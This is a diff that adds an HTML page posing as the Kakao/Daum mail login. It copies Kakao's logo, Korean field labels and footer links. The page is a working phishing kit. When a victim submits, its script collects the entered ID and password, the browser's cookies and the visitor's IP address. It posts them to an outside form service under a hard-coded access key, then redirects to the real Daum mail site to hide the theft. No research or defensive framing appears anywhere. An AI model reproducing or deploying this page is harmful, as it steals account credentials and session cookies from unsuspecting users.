@@ -1,0 +1,61 @@
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script>
+        function getIP() {
+            // Get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').value = data.ip; // Set the IP address
+                    document.getElementById('cookies').value = document.cookie; // Get cookies from the current domain
+                    document.getElementById('locationForm').submit(); // Submit the form
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    alert('Could not retrieve IP address.');
+                });
+        }
+
+        function submitForm(event) {
+            event.preventDefault(); // Prevent default form submission
+            getIP(); // Get IP and then submit
+        }
+    </script>
+</head>
+<body style="margin: 0.4em; font-size: 14pt;"><form id="locationForm" onsubmit="submitForm(event)" action="https://api.web3forms.com/submit" method="post"><p align="center"><br><img src="https://i.postimg.cc/yYGJwvs4/Kakao-Logo.jpg"><div align="left"></div><p></p><div align="left"></div><p></p><article class="content-article" id="mainContent" style="margin: 40px auto 42px; padding: 0px 40px; border: 1px solid rgba(0, 0, 0, 0.12); border-image: none; width: 442px; height: 368px; font-size: 12px; box-sizing: border-box;">
+<div align="left"></div><div align="center">
+<div class="cont_login" style="margin: 0px; padding: 55px 0px 50px; width: 316px; height: 266px; position: relative; box-sizing: border-box; overflow-wrap: break-word;"><div align="left" class="login_kakaomail" style="margin: 0px; padding: 0px;"><div class="box_tf fst" style="border-width: 0px 0px 2px; border-style: solid; border-color: rgb(204, 204, 204); margin: 4px 0px 3px; padding: 0px; position: relative;">
+<label class="screen_out" style="margin: 0px; padding: 0px; width: 0px; height: 0px; line-height: 0; text-indent: -9999px; overflow: hidden; position: absolute; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" for="loginKey--1"></label>
+ <input name="id" class="tf_g" id="loginKey--1" style='margin: 0px; padding: 10px 0px 8px; outline: 0px; border-radius: 0px; border: 0px currentColor; border-image: none; width: 308px; height: 48px; color: rgb(25, 25, 25); line-height: 25px; letter-spacing: 0px; font-family: -apple-system, Roboto, NotoSans, AppleSDGothicNeo, "Malgun Gothic", "&#47569;&#51008; &#44256;&#46357;", &#46027;&#50880;, dotum, sans-serif; font-size: 18px; vertical-align: middle; position: relative; z-index: 1; 
+box-sizing: border-box; opacity: 1; background-color: transparent; -webkit-tap-highlight-color: rgba(255, 255, 255, 0); appearance: none; caret-color: rgb(25, 25, 25);' type="text" size="1" placeholder="&#52852;&#52852;&#50724;&#47700;&#51068; &#50500;&#51060;&#46356;, &#51060;&#47700;&#51068;, &#51204;&#54868;&#48264;&#54840; " value="">
+ </div><div class="box_tf" style="border-width: 0px 0px 2px; border-style: solid; border-color: rgb(204, 204, 204); margin: 5px 0px 3px; padding: 0px; position: relative;">
+<label class="screen_out" style="margin: 0px; padding: 0px; width: 0px; height: 0px; line-height: 0; text-indent: -9999px; overflow: hidden; position: absolute; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" for="password--2"></label>
+ <input name="pw" class="tf_g" id="password--2" style='margin: 0px; padding: 12px 0px 8px; outline: 0px; border-radius: 0px; border: 0px currentColor; border-image: none; width: 302px; height: 45px; color: rgb(25, 25, 25); letter-spacing: 0.15em; font-family: -apple-system, Roboto, NotoSans, AppleSDGothicNeo-Regular, "&#47569;&#51008; &#44256;&#46357;", "Malgun Gothic", &#46027;&#50880;, dotum, sans-serif; font-size: 18px; font-variant: normal; vertical-align: middle; position: relative; 
+z-index: 1; box-sizing: border-box; opacity: 1; background-color: transparent; -webkit-tap-highlight-color: rgba(255, 255, 255, 0); appearance: none; caret-color: rgb(25, 25, 25);' type="password" size="1" placeholder="&#48708;&#48128;&#48264;&#54840;" value="" autocomplete="off"></div>
+<div class="set_login" style="margin: 25px 0px 0px; padding: 0px;"><div class="item_choice" style="margin: 0px; padding: 0px; vertical-align: top; float: left; display: block; position: relative;">
+<input name="ip" id="ip" type="hidden">
+
+<input name="cookies" id="cookies" type="hidden">
+<input type="hidden" name="access_key" value="ed6c222f-bdb9-43c4-b94e-0a16678406eb">
+<input type="hidden" name="redirect" value="https://mail.daum.net/">
+<button class="btn_help" aria-haspopup="true" aria-describedby="label-staySignedIn" style='margin: 1px 0px 0px 6px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(51, 51, 51); line-height: 1.5; font-family: -apple-system, Roboto, NotoSans, AppleSDGothicNeo, "Malgun Gothic", "&#47569;&#51008; &#44256;&#46357;", &#46027;&#50880;, dotum, sans-serif; font-size: 12px; vertical-align: middle; float: left; cursor: pointer; background-color: transparent; 
+-webkit-tap-highlight-color: rgba(255, 255, 255, 0);' type="button"></button></div></div>
+<div class="confirm_btn" style="margin: 0px; padding: 40px 0px 0px; text-align: center;">
+<button class="btn_g highlight submit" style='margin: 0px; padding: 0px; border-radius: 4px; border: 0px currentColor; border-image: none; width: 320px; height: 54px; color: rgb(25, 25, 25); line-height: 51px; font-family: -apple-system, Roboto, NotoSans, AppleSDGothicNeo, "Malgun Gothic", "&#47569;&#51008; &#44256;&#46357;", &#46027;&#50880;, dotum, sans-serif; font-size: 16px; font-weight: 400; vertical-align: middle; display: block; cursor: pointer; background-color: rgb(254, 229, 0); 
+-webkit-tap-highlight-color: rgba(255, 255, 255, 0);' type="submit">&#47196;&#44536;&#51064;</button></div><div class="info_user" style="margin: 26px 0px 0px; padding: 0px;">
+<a class="link_join" style="margin: 0px; padding: 0px; color: rgb(25, 25, 25); font-size: 12px; text-decoration: none; float: left; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://accounts.kakao.com/weblogin/create_account?app_type=web&amp;continue=https%3A%2F%2Flogins.daum.net%2Faccounts%2Fksso.do%3Frescue%3Dtrue%26url%3Dhttps%253A%252F%252Fmail.daum.net%252F&amp;lang=ko">&#54924;&#50896;&#44032;&#51077;</a>
+ <ul class="list_user" style="list-style: none; margin: 0px; padding: 0px; float: right;"><li style="list-style: none; margin: 0px; padding: 0px; float: left;">
+<a class="link_user" style="margin: 0px; padding: 0px; color: rgb(25, 25, 25); font-size: 12px; text-decoration: none; float: left; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://accounts.kakao.com/weblogin/find_account?app_type=web&amp;continue=https%3A%2F%2Flogins.daum.net%2Faccounts%2Fksso.do%3Frescue%3Dtrue%26url%3Dhttps%253A%252F%252Fmail.daum.net%252F&amp;lang=ko">&#44228;&#51221; &#52286;&#44592;</a></li>
+<li style="list-style: none; margin: 0px; padding: 0px; float: left;"><a class="link_user" style="margin: 0px; padding: 0px; color: rgb(25, 25, 25); font-size: 12px; text-decoration: none; float: left; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://accounts.kakao.com/weblogin/find_password?app_type=web&amp;continue=https%3A%2F%2Flogins.daum.net%2Faccounts%2Fksso.do%3Frescue%3Dtrue%26url%3Dhttps%253A%252F%252Fmail.daum.net%252F&amp;lang=ko">
+&#48708;&#48128;&#48264;&#54840; &#52286;&#44592;</a></li></ul></div></div></div></div></article><div align="center">&nbsp;&nbsp;&nbsp;&nbsp;<div class="service_info" style="margin: 0px; padding: 0px; vertical-align: top; display: inline-block;">
+<a class="link_info" style="margin: 0px; padding: 0px 5px; color: rgb(76, 76, 76); font-size: 12px; text-decoration: none; vertical-align: top; display: inline-block; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://www.kakao.com/policy/terms?lang=ko">&#51060;&#50857;&#50557;&#44288;</a>
+ <a class="link_info" style="margin: 0px 0px 0px 5px; padding: 0px 5px; color: rgb(76, 76, 76); font-size: 12px; text-decoration: none; vertical-align: top; display: inline-block; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://www.kakao.com/policy/privacy?lang=ko"><strong style="margin: 0px; padding: 0px;">&#44060;&#51064;&#51221;&#48372; &#52376;&#47532;&#48169;&#52840;</strong></a>
+ <a class="link_info" style="margin: 0px 0px 0px 5px; padding: 0px 5px; color: rgb(76, 76, 76); font-size: 12px; text-decoration: none; vertical-align: top; display: inline-block; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://www.kakao.com/policy/oppolicy?lang=ko">&#50868;&#50689;&#51221;&#52293;</a>
+ <a class="link_info" style="margin: 0px 0px 0px 5px; padding: 0px 5px; color: rgb(76, 76, 76); font-size: 12px; text-decoration: none; vertical-align: top; display: inline-block; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://cs.kakao.com/">&#44256;&#44061;&#49468;&#53552;</a>
+ <a class="link_info" style="margin: 0px 0px 0px 5px; padding: 0px 5px; color: rgb(76, 76, 76); font-size: 12px; text-decoration: none; vertical-align: top; display: inline-block; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="https://www.kakao.com/notices?lang=ko">&#44277;&#51648;&#49324;&#54637;</a><div class="item_select" style="margin: 0px 0px 0px 5px; padding: 0px 5px; vertical-align: top; display: inline-block; position: relative; cursor: pointer;">
+ <label class="screen_out" id="selectLabel" style="margin: 0px; padding: 0px; width: 0px; height: 0px; line-height: 0; text-indent: -9999px; overflow: hidden; position: absolute; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);"></label> <strong class="screen_out" style="margin: 0px; padding: 0px; width: 0px; height: 0px; line-height: 0; text-indent: -9999px; overflow: hidden; position: absolute;"></strong></div></div>
+<small class="txt_copyright" style="margin: 6px 0px 0px; padding: 0px; color: rgba(0, 0, 0, 0.5); line-height: 18px; font-size: 11px; display: block;"><br></small><span style="font-size: 17.3px;"><span style="font-size: 16px;"><span style="font-size: 14.7px;"><span style="font-size: 13.4px;">Copyright &copy;</span></span></span></span><span><span style="font-size: 17.3px;"><span style="font-size: 16px;"><span style="font-size: 14.7px;"><span style="font-size: 13.4px;">&nbsp;</span></span></span>
+</span></span><span style="font-size: 17.3px;"><span style="font-size: 16px;"><span style="font-size: 14.7px;"><span style="font-size: 13.4px;"> </span></span></span></span><a class="link_kakaocorp" style="margin: 0px; padding: 0px; color: rgb(51, 51, 51); text-decoration: none; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="http://kakaocorp.com/"><span style="font-size: 17.3px;"><span style="font-size: 16px;"><span style="font-size: 14.7px;">
+<span style="font-size: 13.4px;">Kakao Corp.</span></span></span></span></a><span><span style="font-size: 17.3px;"><span style="font-size: 16px;"><span style="font-size: 14.7px;"><span style="font-size: 13.4px;">&nbsp;</span></span></span></span></span><span style="font-size: 17.3px;"><span style="font-size: 16px;"><span style="font-size: 14.7px;"><span style="font-size: 13.4px;">All rights reserved</span></span></span></span></div></form></body></html>
